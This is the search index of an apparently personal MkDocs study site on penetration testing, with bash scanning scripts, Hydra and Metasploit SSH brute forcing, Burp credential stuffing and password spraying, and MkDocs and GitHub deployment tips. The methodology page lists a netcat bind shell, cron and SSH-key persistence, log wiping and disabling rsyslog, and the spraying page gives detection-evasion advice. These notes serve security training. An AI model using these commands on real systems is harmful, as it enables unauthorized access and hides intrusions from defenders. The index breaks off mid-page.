{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"bashguide/","title":"Bash Scripting Guide","text":""},{"location":"bashguide/#introduction-to-bash-scripting","title":"Introduction to Bash Scripting","text":"<p>Bash scripting automates tasks and enhances productivity by executing commands in sequence. Scripts are commonly used for networking, automation, and system administration.</p> <p>To create and edit a Bash script:</p> <pre><code>mousepad script.sh  # Open a text editor (use nano, vim, etc.)\n</code></pre> <p>Add the shebang (<code>#!</code>) at the beginning to specify the interpreter:</p> <pre><code>#!/bin/bash   # Standard shebang for Bash scripts\n</code></pre> <p>Some systems may use <code>#!/usr/bin/bash</code>, but <code>/bin/bash</code> is widely compatible.</p>"},{"location":"bashguide/#understanding-a-simple-ping-script","title":"Understanding a Simple Ping Script","text":""},{"location":"bashguide/#example-command","title":"Example Command:","text":"<pre><code>ping 192.168.1.1 -c 1 &gt; ip.txt\ncat ip.txt | grep \"64 bytes\" | cut -d \" \" -f4 | tr -d \":\"\n</code></pre>"},{"location":"bashguide/#breakdown","title":"Breakdown:","text":"<ol> <li><code>ping 192.168.1.1 -c 1 &gt; ip.txt</code> \u2192 Sends one ICMP echo request (<code>-c 1</code>) and saves output to <code>ip.txt</code>.</li> <li><code>cat ip.txt</code> \u2192 Reads the contents of <code>ip.txt</code>.</li> <li><code>grep \"64 bytes\"</code> \u2192 Filters lines that contain <code>\"64 bytes\"</code>, indicating a successful ping.</li> <li><code>cut -d \" \" -f4</code> \u2192 Splits the line by spaces (<code>-d \" \"</code>), extracts 4th field (IP address).</li> <li><code>tr -d \":\"</code> \u2192 Removes trailing <code>:</code>.</li> </ol> <p>One-Liner:</p> <pre><code>ping -c 1 192.168.1.1 | grep \"64 bytes\" | cut -d \" \" -f4 | tr -d \":\"\n</code></pre>"},{"location":"bashguide/#ip-sweep-script-ipsweepsh","title":"IP Sweep Script (<code>ipsweep.sh</code>)","text":""},{"location":"bashguide/#purpose","title":"Purpose:","text":"<p>This script pings all 254 hosts in a subnet (<code>x.x.x.1 - x.x.x.254</code>) and returns live hosts.</p>"},{"location":"bashguide/#script","title":"Script:","text":"<pre><code>#!/bin/bash\n\nif [ \"$#\" -ne 1 ]; then\n    echo \"Usage: ./ipsweep.sh &lt;network-prefix&gt;\"\n    exit 1\nfi\n\nfor ip in $(seq 1 254); do\n    ping -c 1 $1.$ip | grep \"64 bytes\" | cut -d \" \" -f4 | tr -d \":\" &amp;\ndone\nwait\n</code></pre>"},{"location":"bashguide/#explanation","title":"Explanation:","text":"<ul> <li><code>$1</code> \u2192 First argument passed to the script (e.g., <code>192.168.1</code>).</li> <li><code>seq 1 254</code> \u2192 Loops from 1 to 254 (valid host addresses).</li> <li><code>ping -c 1 $1.$ip</code> \u2192 Pings each IP in the subnet.</li> <li><code>grep \"64 bytes\"</code> \u2192 Filters successful responses.</li> <li><code>cut -d \" \" -f4 | tr -d \":\"</code> \u2192 Extracts and cleans up the responding IP.</li> <li><code>&amp;</code> \u2192 Runs pings in parallel for speed.</li> <li><code>wait</code> \u2192 Ensures all background processes complete before script exits.</li> </ul>"},{"location":"bashguide/#executing-the-script","title":"Executing the Script:","text":"<pre><code>chmod +x ipsweep.sh  # Make it executable\n./ipsweep.sh 192.168.1  # Run the script with a subnet prefix\n</code></pre>"},{"location":"bashguide/#one-liner-nmap-scan-script","title":"One-Liner Nmap Scan Script","text":""},{"location":"bashguide/#script_1","title":"Script:","text":"<pre><code>for ip in $(cat ips.txt); do nmap -sn $ip; done\n</code></pre>"},{"location":"bashguide/#explanation_1","title":"Explanation:","text":"<ul> <li><code>cat ips.txt</code> \u2192 Reads IPs from <code>ips.txt</code> (each IP on a new line).</li> <li><code>for ip in $(cat ips.txt); do ... done</code> \u2192 Iterates over each IP.</li> <li><code>nmap -sP $ip</code> \u2192 Runs a ping scan (<code>-sn</code> checks if host is up).</li> </ul>"},{"location":"bashguide/#additional-useful-scripts","title":"Additional Useful Scripts","text":""},{"location":"bashguide/#port-scanner-using-netcat","title":"Port Scanner Using Netcat","text":"<pre><code>#!/bin/bash\n\nif [ \"$#\" -ne 2 ]; then\n    echo \"Usage: ./portscan.sh &lt;IP&gt; &lt;Port-Range&gt;\"\n    exit 1\nfi\n\nfor port in $(seq $2); do\n    (echo &gt; /dev/tcp/$1/$port) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"Port $port is open\" || echo \"Port $port is closed\"\ndone\n</code></pre>"},{"location":"bashguide/#explanation_2","title":"Explanation:","text":"<ul> <li><code>/dev/tcp/$1/$port</code> \u2192 Uses Bash TCP sockets to check port status.</li> <li><code>&gt;/dev/null 2&gt;&amp;1</code> \u2192 Suppresses errors for closed ports.</li> <li><code>echo \"Port $port is open\"</code> \u2192 Prints open ports.</li> </ul>"},{"location":"bashguide/#executing-the-script_1","title":"Executing the Script:","text":"<pre><code>chmod +x portscan.sh\n./portscan.sh 192.168.1.1 80-100  # Scan ports 80-100\n</code></pre>"},{"location":"bashguide/#script-for-automated-backups","title":"Script for Automated Backups","text":"<pre><code>#!/bin/bash\nBACKUP_DIR=\"$HOME/backup\"\nmkdir -p $BACKUP_DIR\ntar -czf $BACKUP_DIR/backup_$(date +%F).tar.gz $HOME/Documents\n</code></pre>"},{"location":"bashguide/#explanation_3","title":"Explanation:","text":"<ul> <li><code>mkdir -p $BACKUP_DIR</code> \u2192 Creates backup directory if not exists.</li> <li><code>tar -czf</code> \u2192 Compresses files into a <code>.tar.gz</code> archive.</li> <li><code>$(date +%F)</code> \u2192 Appends current date to backup file name.</li> </ul>"},{"location":"bashguide/#executing-the-script_2","title":"Executing the Script:","text":"<pre><code>chmod +x backup.sh\n./backup.sh\n</code></pre>"},{"location":"bashguide/#conclusion","title":"Conclusion","text":"<p>Bash scripting is a powerful tool for networking, automation, and security tasks. This guide covered: - Ping sweeps &amp; Nmap automation - Loops, arguments (<code>$1</code>), and conditionals - Useful scripts for scanning &amp; backups</p>"},{"location":"bruteforce/","title":"Bruteforce Attacks Guide","text":""},{"location":"bruteforce/#introduction","title":"Introduction","text":"<p>Bruteforce attacks involve systematically trying multiple usernames and passwords to gain access to a target system. This technique is useful for testing password strength, identifying weak/default credentials, and evaluating blue team detection capabilities.</p> <p>Warning: Bruteforce attacks against SSH are loud and can be easily detected by defensive teams.</p>"},{"location":"bruteforce/#bruteforcing-ssh-with-hydra","title":"Bruteforcing SSH with Hydra","text":"<p>Hydra is a fast and flexible password brute-force tool that supports multiple protocols, including SSH.</p>"},{"location":"bruteforce/#basic-ssh-bruteforce-attack","title":"Basic SSH Bruteforce Attack","text":"<pre><code>hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V\n</code></pre>"},{"location":"bruteforce/#breakdown-of-the-command","title":"Breakdown of the Command:","text":"<ul> <li><code>hydra</code> \u2192 Launches the Hydra tool.</li> <li><code>-l root</code> \u2192 Specifies the username (lowercase <code>-l</code> means single user).</li> <li><code>-P /usr/share/wordlists/metasploit/unix_passwords.txt</code> \u2192 Uses a wordlist to try multiple passwords.</li> <li><code>ssh://192.168.13.143:22</code> \u2192 Defines the target SSH service and port.</li> <li><code>-t 4</code> \u2192 Uses 4 parallel attack threads (lower numbers = stealthier, higher = noisier but faster).</li> <li><code>-V</code> \u2192 Enables verbose mode (shows each attempt in real time).</li> </ul>"},{"location":"bruteforce/#user-bruteforcing","title":"User Bruteforcing","text":"<p>If we want to test multiple usernames, we use an uppercase <code>-L</code>:</p> <pre><code>hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V\n</code></pre> <ul> <li><code>-L users.txt</code> \u2192 Uses a list of usernames instead of a single one.</li> </ul>"},{"location":"bruteforce/#bruteforcing-ssh-with-metasploit","title":"Bruteforcing SSH with Metasploit","text":"<p>Metasploit has a built-in SSH brute-force module for automated attacks.</p>"},{"location":"bruteforce/#1-launch-msfconsole","title":"1\ufe0f Launch MSFConsole","text":"<pre><code>msfconsole\n</code></pre>"},{"location":"bruteforce/#2-find-the-ssh-bruteforce-module","title":"2\ufe0f Find the SSH Bruteforce Module","text":"<pre><code>search ssh\n</code></pre> <p>Look for:</p> <pre><code>auxiliary/scanner/ssh/ssh_login\n</code></pre>"},{"location":"bruteforce/#3-load-the-ssh-login-module","title":"3\ufe0f Load the SSH Login Module","text":"<pre><code>use auxiliary/scanner/ssh/ssh_login\n</code></pre>"},{"location":"bruteforce/#4-set-required-options","title":"4\ufe0f Set Required Options","text":"<pre><code>options\nset username root\nset pass_file /usr/share/wordlists/metasploit/unix_passwords.txt\nset rhosts 192.168.57.137\n</code></pre> <ul> <li><code>set username root</code> \u2192 Specifies the user.</li> <li><code>set pass_file</code> \u2192 Defines the password wordlist.</li> <li><code>set rhosts</code> \u2192 Specifies the target IP.</li> </ul>"},{"location":"bruteforce/#5-adjust-settings-for-speed-visibility","title":"5\ufe0f Adjust Settings for Speed &amp; Visibility","text":"<pre><code>set threads 10\n</code></pre> <ul> <li>Low threads (1-5) \u2192 Stealthy but slow.</li> <li>Medium threads (5-10) \u2192 Balanced attack speed.</li> <li>High threads (10-20) \u2192 Fast but easily detected.</li> </ul> <pre><code>set verbose true\n</code></pre> <ul> <li>Shows real-time progress in the terminal.</li> </ul>"},{"location":"bruteforce/#6-run-the-attack","title":"6\ufe0f Run the Attack","text":"<pre><code>run\n</code></pre> <p>Metasploit will start attempting logins. If successful, it will display valid credentials.</p>"},{"location":"bruteforce/#additional-considerations","title":"Additional Considerations","text":""},{"location":"bruteforce/#detection-evasion-tips","title":"Detection &amp; Evasion Tips:","text":"<ul> <li>Reduce threads (<code>-t 1</code> or <code>-t 2</code>) to slow down attacks and avoid detection.</li> <li>Use VPNs or proxies to mask your IP.</li> <li>Try different ports (if SSH is running on a non-standard port, e.g., <code>2222</code>).</li> <li>Monitor logs (<code>/var/log/auth.log</code>) to see how attacks are logged.</li> </ul>"},{"location":"bruteforce/#blue-team-countermeasures","title":"Blue Team Countermeasures:","text":"<ul> <li>Fail2Ban: Blocks IPs after multiple failed login attempts.</li> <li>SSH Key Authentication: Disables password-based logins.</li> <li>Rate Limiting: Restricts SSH login attempts.</li> <li>Moving SSH to a non-standard port (e.g., <code>2222</code>) reduces automated attacks.</li> </ul>"},{"location":"bruteforce/#conclusion","title":"Conclusion","text":"<p>Bruteforce attacks are noisy and should only be used for testing password security in ethical hacking engagements. By leveraging Hydra and Metasploit, security professionals can assess the strength of credentials and identify vulnerable SSH services.</p>"},{"location":"burpspray/","title":"Burp Suite - Credential Stuffing &amp; Password Spraying","text":""},{"location":"burpspray/#introduction","title":"Introduction","text":"<p>Burp Suite is a powerful web security testing tool used for testing login security, performing credential stuffing, and executing password spraying attacks. These techniques help identify weak authentication mechanisms and misconfigured login systems.</p> <p>Warning: These attacks can trigger account lockouts, so always test ethically and in a controlled environment.</p>"},{"location":"burpspray/#credential-stuffing","title":"Credential Stuffing","text":""},{"location":"burpspray/#what-is-credential-stuffing","title":"What is Credential Stuffing?","text":"<p>Credential stuffing is an automated attack where attackers use breached username/password pairs in hopes that users have reused their credentials across multiple sites.</p>"},{"location":"burpspray/#how-to-perform-credential-stuffing-in-burp-suite","title":"How to Perform Credential Stuffing in Burp Suite","text":"<p>1\ufe0f Intercept Login Request: - Enable Burp Suite Proxy. - Log in to the target website using any credentials (to capture the request). - Forward the request to see how the login works.</p> <p>2\ufe0f Send to Intruder: - Right-click on the login request \u2192 Send to Intruder. - Clear existing positions (<code>Clear</code> button). - Highlight username and password fields \u2192 Click <code>Add</code>.</p> <p>3\ufe0f Select Attack Type - Pitchfork: - Use <code>Pitchfork Mode</code> (matches each username with its respective password in order).</p> <p>4\ufe0f Configure Payloads: - Go to the Payloads tab. - Payload Set 1: Add a list of breached usernames. - Payload Set 2: Add a list of breached passwords.</p> <p>5\ufe0f Analyze Responses: - Run the attack and analyze response codes. - Look for successful logins (e.g., HTTP 200 instead of 401 or 403). - Use Grep Extract to highlight error messages (e.g., <code>Cannot sign in</code>).</p>"},{"location":"burpspray/#password-spraying","title":"Password Spraying","text":""},{"location":"burpspray/#what-is-password-spraying","title":"What is Password Spraying?","text":"<p>Password spraying is an attack where a few common passwords are tested against many known usernames. Unlike brute force attacks, it avoids account lockouts by limiting attempts per user.</p>"},{"location":"burpspray/#how-to-perform-password-spraying-in-burp-suite","title":"How to Perform Password Spraying in Burp Suite","text":"<p>1\ufe0f Capture a Login Request: - Enable Burp Suite Proxy. - Log in with any credentials and send the request to Intruder.</p> <p>2\ufe0f Modify the Intruder Attack: - Select Sniper Mode (focuses on one list at a time). - Highlight the password field \u2192 Click <code>Add</code>. - Set the Payload Set 1 to include weak passwords (e.g., <code>Fall2024!</code>, <code>Password123!</code>). - Set the username field to a known list of usernames.</p> <p>3\ufe0f Control Attack Speed: - Run only 1-2 attempts per user to avoid triggering security mechanisms.</p> <p>4\ufe0f Check Responses: - Analyze status codes or error messages to identify successful login attempts.</p>"},{"location":"burpspray/#best-practices-detection-avoidance","title":"Best Practices &amp; Detection Avoidance","text":"<ul> <li>Use low request rates to avoid account lockouts.</li> <li>Monitor response codes to detect successful login attempts.</li> <li>Change user agents &amp; headers to mimic normal traffic.</li> <li>Use proxy rotation (e.g., Burp Collaborator) to evade detection.</li> </ul>"},{"location":"burpspray/#conclusion","title":"Conclusion","text":"<p>Burp Suite provides powerful automation for testing authentication security. Credential stuffing and password spraying can help identify weak login protections, but they should only be used in authorized security testing engagements.</p>"},{"location":"cherry/","title":"Using Linux Cherrytree for Documentation","text":""},{"location":"cherry/#introduction","title":"Introduction","text":"<p>Cherrytree is a powerful hierarchical note-taking application that allows penetration testers and security professionals to document findings, organize research, and store structured data. It supports rich text, code highlighting, and encryption, making it an ideal tool for security assessments and documentation.</p>"},{"location":"cherry/#installing-cherrytree-on-linux","title":"Installing Cherrytree on Linux","text":"<p>Cherrytree can be installed on most Linux distributions via package managers.</p>"},{"location":"cherry/#ubuntudebian","title":"Ubuntu/Debian","text":"<pre><code>sudo apt update &amp;&amp; sudo apt install cherrytree -y\n</code></pre>"},{"location":"cherry/#arch-linux","title":"Arch Linux","text":"<pre><code>sudo pacman -S cherrytree\n</code></pre>"},{"location":"cherry/#kali-linux","title":"Kali Linux","text":"<pre><code>sudo apt install cherrytree -y\n</code></pre>"},{"location":"cherry/#flatpak-any-linux-distribution","title":"Flatpak (Any Linux Distribution)","text":"<pre><code>flatpak install flathub com.giuspen.cherrytree\n</code></pre>"},{"location":"cherry/#navigating-cherrytree","title":"Navigating Cherrytree","text":""},{"location":"cherry/#1-creating-a-new-notebook","title":"1. Creating a New Notebook","text":"<ul> <li>Open Cherrytree.</li> <li>Click File &gt; New Instance to create a new notebook.</li> <li>Save the file as pentest-notes.ctb (or <code>.ctx</code> for XML format).</li> </ul>"},{"location":"cherry/#2-organizing-notes-with-nodes-subnodes","title":"2. Organizing Notes with Nodes &amp; Subnodes","text":"<ul> <li>Click \u201c+\u201d to create a new Node (acts as a section).</li> <li>Right-click a node \u2192 New Subnode (nested categories).</li> <li>Rename nodes by double-clicking.</li> </ul> <p>Example Folder Structure for Pentesting:</p> <pre><code>\ud83d\udcc2 Pentest Engagement\n \u251c\u2500\u2500 \ud83d\uddc2\ufe0f Recon\n \u2502    \u251c\u2500\u2500 Nmap Scan Results\n \u2502    \u251c\u2500\u2500 Subdomain Enumeration\n \u251c\u2500\u2500 \ud83d\uddc2\ufe0f Exploitation\n \u2502    \u251c\u2500\u2500 Credentials &amp; Payloads\n \u2502    \u251c\u2500\u2500 Exploit PoCs\n \u251c\u2500\u2500 \ud83d\uddc2\ufe0f Post-Exploitation\n \u2502    \u251c\u2500\u2500 Persistence Methods\n \u2502    \u251c\u2500\u2500 Data Exfiltration Notes\n</code></pre>"},{"location":"cherry/#documenting-findings","title":"Documenting Findings","text":""},{"location":"cherry/#3-adding-text-code-blocks","title":"3. Adding Text &amp; Code Blocks","text":"<ul> <li>Use rich text formatting for headers, bullet points, and highlights.</li> <li>Insert code snippets with syntax highlighting:</li> <li>Click Insert &gt; Codebox.</li> <li>Choose the appropriate language (e.g., Bash, Python, SQL, etc.).</li> </ul> <p>Example:</p> <pre><code>nmap -p- -A -T4 target.com\n</code></pre>"},{"location":"cherry/#4-inserting-images-attachments","title":"4. Inserting Images &amp; Attachments","text":"<ul> <li>Drag &amp; drop images into a node to include screenshots.</li> <li>Click Insert &gt; File to attach external reports.</li> </ul>"},{"location":"cherry/#5-encrypting-notes-for-security","title":"5. Encrypting Notes for Security","text":"<ul> <li>Click File &gt; Password Protection to encrypt the entire document.</li> <li>Uses AES encryption to protect sensitive information.</li> </ul>"},{"location":"cherry/#6-using-search-for-quick-access","title":"6. Using Search for Quick Access","text":"<ul> <li>Use <code>CTRL + F</code> to search within notes.</li> <li><code>CTRL + Shift + F</code> allows searching across all nodes.</li> </ul>"},{"location":"cherry/#best-practices-for-documentation","title":"Best Practices for Documentation","text":""},{"location":"cherry/#7-keep-everything-structured","title":"7. Keep Everything Structured","text":"<ul> <li>Use consistent naming conventions for nodes (e.g., <code>Target - Service - Details</code>).</li> <li>Organize findings logically in Recon &gt; Exploitation &gt; Post-Exploitation.</li> </ul>"},{"location":"cherry/#8-timestamp-key-findings","title":"8. Timestamp Key Findings","text":"<ul> <li>Use <code>CTRL + SHIFT + T</code> to insert a timestamp.</li> <li>Helps track when vulnerabilities were found and reported.</li> </ul>"},{"location":"cherry/#9-backup-your-notes","title":"9. Backup Your Notes","text":"<ul> <li>Export notes to plaintext, PDF, or HTML for backups.</li> <li>Store backups securely in an encrypted volume.</li> </ul> <p>Example Backup Command:</p> <pre><code>tar -czf pentest-notes-backup.tar.gz pentest-notes.ctb\n</code></pre>"},{"location":"cherry/#10-sync-notes-across-devices","title":"10. Sync Notes Across Devices","text":"<ul> <li>Use Nextcloud, Syncthing, or Encrypted USB for syncing across machines.</li> <li>Avoid storing sensitive Cherrytree files in unencrypted cloud storage.</li> </ul>"},{"location":"cherry/#conclusion","title":"Conclusion","text":"<p>Cherrytree is a structured, secure, and versatile note-taking tool for penetration testers and cybersecurity professionals. By following best practices, you can effectively document and protect findings throughout an assessment.</p> <p>Stay organized, document findings properly, and secure your notes efficiently.</p>"},{"location":"create/","title":"Creating MkDocs Pages &amp; Managing Navigation","text":""},{"location":"create/#introduction","title":"Introduction","text":"<p>MkDocs is a powerful static site generator designed for documentation projects. This guide covers how to create new MkDocs pages and manage site navigation using <code>mkdocs.yml</code>.</p>"},{"location":"create/#creating-a-new-mkdocs-page","title":"Creating a New MkDocs Page","text":"<p>Each page in MkDocs is a Markdown (**<code>.md</code>**********) file stored in the <code>docs/</code> directory.</p>"},{"location":"create/#steps-to-create-a-page","title":"Steps to Create a Page:","text":"<ol> <li>Navigate to the **<code>docs/</code>** folder:    <code>bash    cd docs/</code></li> <li>Create a new Markdown file:    <code>bash    touch my-new-page.md</code></li> <li>Edit the file using any text editor:    <code>bash    code my-new-page.md</code></li> <li>Add content inside <code>my-new-page.md</code>:    ```markdown    # My New Page</li> </ol> <p>Welcome to my new page in MkDocs!    ```</p>"},{"location":"create/#managing-navigation-in-mkdocsyml","title":"Managing Navigation in <code>mkdocs.yml</code>","text":"<p>Navigation is defined in <code>mkdocs.yml</code> under the <code>nav:</code> section.</p>"},{"location":"create/#example-structure","title":"Example Structure:","text":"<pre><code>site_name: My Documentation\n\nnav:\n  - Home: index.md\n  - Getting Started: getting-started.md\n  - Features:\n      - Page One: page-one.md\n      - Page Two: page-two.md\n  - About: about.md\n</code></pre>"},{"location":"create/#explanation","title":"Explanation:","text":"<ul> <li>Top-level items (e.g., <code>Home</code>, <code>Getting Started</code>, <code>About</code>) are direct links.</li> <li>Nested items under <code>Features</code> group related pages together.</li> <li>Each entry follows the format: <code>Page Title: filename.md</code>.</li> </ul>"},{"location":"create/#previewing-changes-locally","title":"Previewing Changes Locally","text":"<p>After adding pages or updating navigation, preview the changes using:</p> <pre><code>mkdocs serve\n</code></pre> <p>Visit <code>http://127.0.0.1:8000/</code> in your browser to see the live site.</p>"},{"location":"create/#deploying-the-site","title":"Deploying the Site","text":"<p>When ready, build and deploy the MkDocs site:</p> <pre><code>mkdocs build\nmkdocs gh-deploy\n</code></pre> <p>This will generate static files in the <code>site/</code> folder and deploy them to GitHub Pages if configured.</p>"},{"location":"create/#best-practices","title":"Best Practices","text":"<ul> <li>Keep file names lowercase and use <code>-</code> instead of spaces.</li> <li>Structure navigation logically for easy access.</li> <li>Use nested navigation for better organization.</li> <li>Regularly run <code>mkdocs serve</code> to preview changes before deployment.</li> </ul>"},{"location":"create/#conclusion","title":"Conclusion","text":"<p>Creating pages in MkDocs is simple, and navigation is controlled via <code>mkdocs.yml</code>. By following these best practices, you can build a well-organized documentation site with ease.</p>"},{"location":"github/","title":"Managing MkDocs with GitHub","text":""},{"location":"github/#introduction","title":"Introduction","text":"<p>Using GitHub for version control and deployment is an essential practice when managing MkDocs projects. This guide covers how to create a new repository, update documentation, and deploy it to GitHub Pages.</p>"},{"location":"github/#creating-a-new-github-repository","title":"Creating a New GitHub Repository","text":"<ol> <li>Go to GitHub and log in.</li> <li>Click on <code>+</code> (top-right) \u2192 <code>New repository</code>.</li> <li>Enter repository details:</li> <li>Repository name: <code>my-mkdocs-site</code></li> <li>Description (optional): \"Documentation for my project\"</li> <li>Choose Public or Private.</li> <li>Check Add a README (optional).</li> <li>Click <code>Create repository</code>.</li> </ol>"},{"location":"github/#cloning-the-repository","title":"Cloning the Repository","text":"<p>After creating the repository, clone it to your local machine:</p> <pre><code>git clone https://github.com/your-username/my-mkdocs-site.git\ncd my-mkdocs-site\n</code></pre>"},{"location":"github/#updating-mkdocs-and-pushing-to-github","title":"Updating MkDocs and Pushing to GitHub","text":"<p>When making changes to MkDocs documentation, follow these steps:</p> <ol> <li>Stage all changes:    <code>bash    git add .</code></li> <li>Commit the changes:    <code>bash    git commit -m \"Added my new page\"</code></li> <li>Push to GitHub:    <code>bash    git push origin main</code></li> <li>Deploy the site to GitHub Pages:    <code>bash    mkdocs gh-deploy</code></li> </ol> <pre><code>mkdocs build --clean\ngit add .\ngit commit -m \"comment\"\ngit push origin main\nmkdocs gh-deploy\n</code></pre> <p>This will build and deploy your MkDocs site to GitHub Pages.</p>"},{"location":"github/#configuring-github-pages","title":"Configuring GitHub Pages","text":"<p>Ensure that GitHub Pages is enabled for your repository:</p> <ol> <li>Go to your repository on GitHub.</li> <li>Navigate to Settings &gt; Pages.</li> <li>Under Branch, select <code>gh-pages</code>.</li> <li>Click Save.</li> <li>Your site will be available at:    <code>https://your-username.github.io/my-mkdocs-site/</code></li> </ol>"},{"location":"github/#best-practices","title":"Best Practices","text":"<ul> <li>Always commit meaningful messages (<code>git commit -m \"Updated navigation\"</code>).</li> <li>Regularly pull updates from the repository before making changes:   <code>bash   git pull origin main</code></li> <li>Check Git status to review changes before committing:   <code>bash   git status</code></li> </ul>"},{"location":"github/#conclusion","title":"Conclusion","text":"<p>Using GitHub for MkDocs makes it easy to manage documentation changes and deploy updates. By following these steps, you can keep your project well-organized and version-controlled.</p>"},{"location":"hmet/","title":"Hacking Methodology","text":""},{"location":"hmet/#the-5-stages-of-hacking","title":"The 5 Stages of Hacking","text":"<p>Hacking follows a structured methodology to assess and exploit security weaknesses. Below are the five key stages of hacking, from reconnaissance to covering tracks.</p>"},{"location":"hmet/#1-passive-active-reconnaissance","title":"1\ufe0f Passive &amp; Active Reconnaissance","text":""},{"location":"hmet/#passive-reconnaissance","title":"Passive Reconnaissance","text":"<ul> <li>Involves gathering information about the target without directly interacting with it.</li> <li>Techniques:</li> <li>WHOIS lookups</li> <li>Google dorking</li> <li>Social media profiling</li> <li>DNS enumeration</li> <li>Public document metadata analysis (e.g., FOCA tool)</li> </ul>"},{"location":"hmet/#active-reconnaissance","title":"Active Reconnaissance","text":"<ul> <li>Directly interacts with the target to gather information.</li> <li>Techniques:</li> <li>Ping sweeps (<code>nmap -sn &lt;target&gt;</code>)</li> <li>Port scanning (<code>nmap -sS &lt;target&gt;</code>)</li> <li>Service &amp; version detection (<code>nmap -sV &lt;target&gt;</code>)</li> <li>OS fingerprinting (<code>nmap -O &lt;target&gt;</code>)</li> </ul>"},{"location":"hmet/#2-enumeration","title":"2\ufe0f Enumeration","text":"<p>Enumeration is the process of extracting detailed system information, such as usernames, shares, and services, to identify potential entry points.</p>"},{"location":"hmet/#common-enumeration-techniques","title":"Common Enumeration Techniques:","text":"<ul> <li>NetBIOS Enumeration: <code>nmblookup -A &lt;target&gt;</code></li> <li>SMB Enumeration: <code>enum4linux -a &lt;target&gt;</code></li> <li>SNMP Enumeration: <code>snmpwalk -v 2c -c public &lt;target&gt;</code></li> <li>DNS Zone Transfers: <code>dig axfr @&lt;target&gt;</code></li> <li>User Enumeration on Web Apps: Using <code>wfuzz</code> or <code>gobuster</code> for directory and file brute-forcing.</li> </ul>"},{"location":"hmet/#3-gaining-access","title":"3\ufe0f Gaining Access","text":"<p>This phase involves exploiting vulnerabilities to gain unauthorized access.</p>"},{"location":"hmet/#common-attack-vectors","title":"Common Attack Vectors:","text":"<ul> <li>Exploiting unpatched vulnerabilities (<code>searchsploit &lt;service&gt;</code> to find exploits)</li> <li>Password attacks (Brute-force using <code>hydra</code> or <code>john</code>)</li> <li>Web application attacks (SQL Injection, XSS, CSRF)</li> <li>Phishing attacks (Social engineering to gain credentials)</li> <li>Privilege escalation (<code>sudo -l</code> or <code>linpeas.sh</code> for misconfigurations)</li> </ul>"},{"location":"hmet/#4-maintaining-access","title":"4\ufe0f Maintaining Access","text":"<p>Once access is gained, the next step is ensuring continued access for later use.</p>"},{"location":"hmet/#persistence-techniques","title":"Persistence Techniques:","text":"<ul> <li>Creating a backdoor: Using Netcat:   <code>bash   nc -lvnp 4444 -e /bin/bash</code></li> <li>Adding SSH keys for persistence: <code>bash   echo \"your-public-key\" &gt;&gt; ~/.ssh/authorized_keys</code></li> <li>Installing rootkits: (e.g., <code>Trojans</code> or <code>keyloggers</code> to maintain control)</li> <li>Setting up scheduled tasks or cron jobs: <code>bash   crontab -e   @reboot /path/to/backdoor.sh</code></li> </ul>"},{"location":"hmet/#5-covering-tracks","title":"5\ufe0f Covering Tracks","text":"<p>To avoid detection, hackers remove traces of their activities.</p>"},{"location":"hmet/#log-clearing-evidence-removal","title":"Log Clearing &amp; Evidence Removal:","text":"<ul> <li>Clearing Bash History: <code>bash   history -c &amp;&amp; history -w</code></li> <li>Clearing System Logs: <code>bash   echo \"\" &gt; /var/log/auth.log   echo \"\" &gt; /var/log/syslog</code></li> <li>Disabling Logging: <code>bash   service rsyslog stop</code></li> <li>Hiding processes using <code>rootkits</code> (e.g., <code>libprocesshider</code>)</li> </ul>"},{"location":"hmet/#conclusion","title":"Conclusion","text":"<p>Understanding the five stages of hacking is essential for recognizing and mitigating potential threats. Ethical professionals use these concepts to strengthen security and protect systems from real-world attacks.</p>"},{"location":"igtools/","title":"Information Gathering Tools","text":""},{"location":"igtools/#introduction","title":"Introduction","text":"<p>Information gathering, also known as reconnaissance, is the first phase in penetration testing. It involves collecting publicly available data about a target before attempting an attack. The goal is to identify weaknesses, technologies in use, and potential entry points.</p>"},{"location":"igtools/#useful-reconnaissance-tools-websites","title":"Useful Reconnaissance Tools &amp; Websites","text":""},{"location":"igtools/#1-email-breach-lookup","title":"1\ufe0f Email &amp; Breach Lookup","text":""},{"location":"igtools/#hunterio","title":"Hunter.io","text":"<ul> <li>Use Case: Finds publicly available emails associated with a domain.</li> <li>Website: https://hunter.io</li> <li>Example Usage:</li> <li>Search a company domain and get a list of associated emails.</li> <li>Identify email patterns (e.g., <code>firstname.lastname@company.com</code>).</li> </ul>"},{"location":"igtools/#have-i-been-pwned","title":"Have I Been Pwned","text":"<ul> <li>Use Case: Checks if an email or password has been compromised in data breaches.</li> <li>Website: https://haveibeenpwned.com</li> <li>Example Usage:</li> <li>Check if a target email appears in a past breach.</li> <li>Find breached passwords that may be used elsewhere.</li> </ul>"},{"location":"igtools/#2-subdomain-enumeration","title":"2\ufe0f Subdomain Enumeration","text":""},{"location":"igtools/#sublist3r","title":"Sublist3r","text":"<ul> <li>Use Case: Finds subdomains of a target domain.</li> <li>Command: <code>bash   sublist3r -d example.com</code></li> <li>Why It's Useful:</li> <li>Identifies alternative entry points.</li> <li>Reveals test/staging environments that may be misconfigured.</li> </ul>"},{"location":"igtools/#crtsh","title":"crt.sh","text":"<ul> <li>Use Case: Queries Certificate Transparency Logs for subdomains.</li> <li>Website: https://crt.sh</li> <li>Why It's Useful:</li> <li>Finds subdomains from SSL certificates.</li> <li>Identifies internal infrastructure if leaked.</li> </ul>"},{"location":"igtools/#owasp-amass","title":"OWASP Amass","text":"<ul> <li>Use Case: Automated asset discovery and subdomain enumeration.</li> <li>Command: <code>bash   amass enum -d example.com</code></li> <li>Why It's Useful:</li> <li>Uses multiple data sources for thorough enumeration.</li> <li>Can perform passive and active recon.</li> </ul>"},{"location":"igtools/#3-technology-fingerprinting","title":"3\ufe0f Technology Fingerprinting","text":""},{"location":"igtools/#builtwith","title":"BuiltWith","text":"<ul> <li>Use Case: 